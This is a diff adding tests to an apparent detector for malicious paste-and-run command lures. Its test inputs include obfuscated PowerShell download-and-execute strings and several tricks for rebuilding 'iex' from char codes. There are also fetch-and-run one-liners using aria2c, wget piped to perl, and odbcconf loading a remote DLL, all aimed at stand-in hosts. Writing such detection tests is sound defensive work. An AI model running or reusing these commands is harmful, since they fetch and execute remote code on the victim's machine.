@@ -156,3 +156,42 @@ test("deceptive flag arms the guard even when the score is below block", () => {
   assert.equal(r.verdict, "warn");
   assert.ok(r.deceptive);
 });
+
+test("PowerShell string tricks are rebuilt without executing anything", () => {
+  const { rebuildStrings } = require("../src/analyzer.js");
+  for (const [src, want] of [
+    ["('{1}{0}' -f 'ex','i')", "'iex'"],
+    ["&([char]105+[char]101+[char]120)", "&('iex')"],
+    ["[char[]](105,101,120)-join''", "'iex'"],
+    ["('i','e','x') -join ''", "'iex'"],
+    ["'xei'[-1..-3] -join ''", "'iex'"],
+    ["'iQeQx' -creplace 'Q',''", "'iex'"],
+    ["$env:comspec[4,15,25]-join''", "'Iex'"],
+  ]) assert.equal(rebuildStrings(src), want, src);
+});
+
+test("keyword built from [char] codes is detected as download-and-execute", () => {
+  const r = analyze(`powershell -w h -c "&([char]105+[char]101+[char]120)(irm 'https://update.example.com/a')"`, { programmatic: true });
+  assert.equal(r.verdict, "block");
+  assert.ok(r.reasons.some((x) => x.id === "string_reconstruction"));
+  assert.ok(r.reasons.some((x) => x.id === "invoke_expression"));
+});
+
+test("generic parser: unlisted downloader that saves then runs a file", () => {
+  const r = analyze("aria2c https://203.0.113.5/a.exe -o a.exe && a.exe", { programmatic: true });
+  assert.equal(r.verdict, "block", JSON.stringify(r.reasons.map((x) => x.id)));
+  assert.ok(r.reasons.some((x) => x.id === "fetch_and_run"));
+});
+
+test("generic parser: download piped into an unlisted interpreter", () => {
+  const text = "wget -qO- https://get.example.com/x | perl";
+  assert.ok(analyze(text, { programmatic: true }).reasons.some((x) => x.id === "fetch_and_run"));
+  assert.equal(analyze(text, { programmatic: true, pageText: "Press Win + R then Ctrl + V" }).verdict, "block");
+});
+
+test("generic parser: unlisted LOLBin against a remote address is caught with context", () => {
+  const text = "odbcconf.exe /a {regsvr https://203.0.113.50/x.dll}";
+  const r0 = analyze(text, { programmatic: true });
+  assert.ok(r0.reasons.some((x) => x.id === "unknown_program_url"), JSON.stringify(r0.reasons.map((x) => x.id)));
+  assert.equal(analyze(text, { programmatic: true, visibleOnPage: false, trigger: "I'm not a robot" }).verdict, "block");
+});
